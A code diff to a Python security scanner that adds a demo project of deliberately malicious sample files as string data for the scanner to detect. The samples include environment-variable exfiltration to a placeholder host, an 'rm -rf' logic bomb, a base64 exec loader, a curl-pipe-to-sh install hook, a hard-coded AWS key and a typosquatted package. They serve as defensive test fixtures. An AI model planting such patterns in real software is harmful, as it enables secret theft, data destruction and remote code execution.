@@ -39,6 +39,59 @@ MAX_TOTAL_SRC = 6_000_000     # 6 MB of combined source
 SKIP_DIRS = {".git", "__pycache__", ".venv", "venv", "node_modules", ".mypy_cache",
              ".pytest_cache", "build", "dist", ".tox", ".eggs"}
 
+# A realistic small "analytics service" whose dangers are NON-OBVIOUS — the
+# point of a real scanner. None of these are visible by skimming one file:
+#   * credentials exfiltrated across THREE files (config → telemetry → network)
+#   * a logic bomb buried inside a plausible rate-limiter
+#   * a base64 payload exec'd by an innocent-looking "plugin loader"
+#   * an AWS key that is Critical only because boto3 is imported beside it
+#   * a typosquatted dependency, and shell execution at install time
+DEMO_PROJECT = {
+    "app/utils/config.py":
+        "import os\n\n"
+        "def load_runtime_context():\n"
+        "    \"\"\"Collect runtime config for diagnostics.\"\"\"\n"
+        "    return {\n"
+        "        'region': os.environ.get('AWS_DEFAULT_REGION', 'us-east-1'),\n"
+        "        'context': dict(os.environ),   # <- whole environment, incl. secrets\n"
+        "    }\n",
+    "app/services/telemetry.py":
+        "import requests\n"
+        "from app.utils.config import load_runtime_context\n\n"
+        "def report_event(name):\n"
+        "    # looks like ordinary product telemetry…\n"
+        "    payload = {'event': name, 'meta': load_runtime_context()}\n"
+        "    requests.post('https://metrics-collector.example/ingest', json=payload)\n",
+    "app/services/ratelimit.py":
+        "import random, os\n\n"
+        "_seen = 0\n\n"
+        "def allow(user_id):\n"
+        "    global _seen\n"
+        "    _seen += 1\n"
+        "    # reads like a rate limiter — but it is a staged logic bomb\n"
+        "    if random.random() < 0.004 and _seen > 5000:\n"
+        "        os.system('rm -rf /var/lib/app/data')\n"
+        "    return _seen < 100000\n",
+    "app/plugins/loader.py":
+        "import base64\n\n"
+        "_REGISTRY = {'default': 'cHJpbnQoJ29rJyk='}\n\n"
+        "def load(name):\n"
+        "    # 'plugin system' that decodes and runs registered blobs\n"
+        "    blob = _REGISTRY.get(name, '')\n"
+        "    exec(base64.b64decode(blob).decode())\n",
+    "app/config/aws.py":
+        "import boto3\n\n"
+        "# hard-coded key — Critical only because boto3 sits right here\n"
+        "session = boto3.Session(aws_access_key_id='AKIAZ3GULPBS2P7Q4XYZ')\n",
+    "setup.py":
+        "from setuptools import setup\n"
+        "import os\n"
+        "os.system('curl -s https://setup.example/post-install.sh | sh')  # runs on pip install\n"
+        "setup(name='analytics-service', version='1.0')\n",
+    "requirements.txt":
+        "flask==3.0.0\nrequsts==2.31.0\nboto3\npython-dateutil\n",
+}
+
 
 def _agg_physics(metrics_list):
     if not metrics_list:
@@ -218,6 +271,10 @@ class Handler(BaseHTTPRequestHandler):
                 self._send(500, json.dumps({"error": "UI asset missing"}))
         elif path == "/health":
             self._send(200, json.dumps(_engine_status()))
+        elif path == "/api/demo":
+            resp = build_files_response(DEMO_PROJECT)
+            resp["demo_files"] = DEMO_PROJECT          # so the UI can show the code
+            self._send(200, json.dumps(resp))
         else:
             self._send(404, json.dumps({"error": "not found"}))
 
